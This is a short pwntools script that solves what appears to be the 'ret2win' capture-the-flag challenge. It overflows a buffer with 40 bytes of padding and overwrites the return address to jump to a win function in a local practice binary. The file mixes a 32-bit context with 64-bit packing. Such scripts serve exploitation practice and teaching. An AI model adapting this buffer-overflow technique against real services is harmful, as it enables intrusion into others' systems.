#!/usr/bin/env python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.bits = 32
gs = '''
continue
'''

elf = context.binary = ELF('./ret2win')

def start():
    if args.GDB:
        #return gdb.attach(process(elf.path), gs)
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process(elf.path)
r = start()

#========= exploit here ===================

junk = b'A'*32 + b'B'*8
win = p64(0x00400764)

payload = junk
payload += win

r.sendlineafter('>', payload)

#========= interactive ====================
r.interactive()

#GDB not working properly
